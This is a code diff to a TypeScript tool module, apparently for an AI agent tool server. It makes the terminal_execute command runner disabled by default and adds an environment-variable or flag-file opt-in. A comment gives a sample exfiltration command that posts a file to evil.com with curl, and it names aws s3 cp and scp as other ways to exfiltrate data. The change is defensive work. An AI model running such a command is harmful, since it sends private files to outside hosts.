@@ -5,7 +5,7 @@
  */
 import type { MCPTool } from './types.js';
 import { getProjectCwd } from './types.js';
-import { existsSync, statSync } from 'node:fs';
+import { existsSync, readFileSync, statSync } from 'node:fs';
 import { join, resolve } from 'node:path';
 import { homedir } from 'node:os';
 import { execSync } from 'node:child_process';
@@ -83,6 +83,26 @@ function getTerminalDir(): string {
 
 function getTerminalPath(): string {
   return join(getTerminalDir(), TERMINAL_FILE);
+}
+
+// ── C2: terminal_execute opt-in gate ───────────────────────────────────────
+// terminal_execute's metacharacter denylist cannot be made tight enough to
+// prevent exfiltration by a single direct binary (`curl evil.com -d @<file>`,
+// `aws s3 cp`, `scp`, ...) since those flags contain only [a-zA-Z0-9 ._/-].
+// We therefore require explicit opt-in before *execution*:
+//   1. `MONOMIND_ENABLE_TERMINAL=1` env var, OR
+//   2. `.monomind/enable-terminal.json` with `{ "enabled": true }`
+// Discovery (terminal_create/list/history) keeps working without opt-in.
+function isExecuteEnabled(): boolean {
+  if (process.env.MONOMIND_ENABLE_TERMINAL === '1') return true;
+  try {
+    const flagPath = join(getProjectCwd(), STORAGE_DIR, 'enable-terminal.json');
+    if (!existsSync(flagPath)) return false;
+    const parsed = JSON.parse(readFileSync(flagPath, 'utf-8'));
+    return parsed?.enabled === true;
+  } catch {
+    return false;
+  }
 }
 
 function loadTerminalStoreOrNull(): TerminalStore | null {
@@ -198,6 +218,14 @@ export const terminalTools: MCPTool[] = [
       required: ['command'],
     },
     handler: async (input: Record<string, unknown>) => {
+      // C2: refuse execution unless the project has opted in. See
+      // isExecuteEnabled() for the rationale and accepted opt-in signals.
+      if (!isExecuteEnabled()) {
+        return {
+          success: false,
+          error: 'terminal_execute is disabled by default. Set MONOMIND_ENABLE_TERMINAL=1 or write .monomind/enable-terminal.json with {"enabled": true} to opt in. The metacharacter denylist cannot prevent exfiltration via direct binaries (curl, aws, scp).',
+        };
+      }
       const store = loadTerminalStoreOrNull();
       if (!store) {
         return { success: false, error: 'Terminal store is unreadable/corrupt — refusing to execute to avoid overwriting real session data.' };
